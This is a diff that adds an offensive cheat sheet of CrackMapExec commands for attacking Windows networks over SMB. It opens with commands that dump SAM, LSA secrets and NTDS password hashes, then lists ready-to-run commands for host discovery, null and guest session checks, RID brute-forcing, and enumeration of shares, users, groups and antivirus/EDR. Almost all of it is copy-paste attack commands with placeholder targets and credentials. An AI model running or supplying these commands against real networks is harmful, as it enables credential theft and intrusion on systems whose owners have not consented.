@@ -1,1 +1,70 @@
+Get creds:
+SAM
+cme smb 10.0.0.0 -u UserName -p 'PASS' --sam`
+
+LSA
+cme smb 10.0.0.0 -u UserName -p 'PASS' --lsa`
+
+NTDS
+cme smb 10.0.0.0 -u UserName -p 'PASS' --ntds #Via RPC`
+
+Enumerate hosts
+Map network hosts
+Returns a list of live hosts
+#~ cme smb 192.168.1.0/24
+
+Enumerate null sessions
+Checking if Null Session is enabled on the network, can be very useful on a Domain Controller to enumerate users, groups, password policy etc
+#~ cme smb 10.10.10.161 -u '' -p ''
+#~ cme smb 10.10.10.161 --pass-pol
+#~ cme smb 10.10.10.161 --users
+#~ cme smb 10.10.10.161 --groups
+
+Enumerate anonymous logon
+Using a random username and password you can check if the target accepts annonymous/guest logon
+cme smb 10.10.10.178 -u 'a' -p '' --shares
+
+You can also check this behavior with smbclient or rpcclient
+smbclient -N -L \\10.10.10.178
+rpcclient -N -L 10.10.10.178
+
+Enumerate shares and access
+Enumerate permissions on all shares
+
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
+
+By far one of the most useful feature of CME
+The following option is accessible to sponsors only
+If you want to filter only by readable or writable share
+
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE
+
+Enumerate disks
+Enumerate disks on the remote target
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
+
+Enumerate logged on users
+Enumerate logged users on the remote target
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
+
+Enumerate domain users
+Enumerate domain users on the remote target
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
+
+Enumerate users by bruteforcing RID
+Enumerate users by bruteforcing the RID on the remote target
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
+
+Enumerate domain groups
+Enumerate domain groups on the remote target
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups
+
+Enumerate local groups
+Enumerate local groups on the remote target
+#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-group
+
+Enumerate Antivirus/EDR
+Enumerate antivirus installed using CrackMapExec
+You don't need to be a privileged user to do this action
+crackmapexec smb <ip> -u user -p pass -M enum_av
 
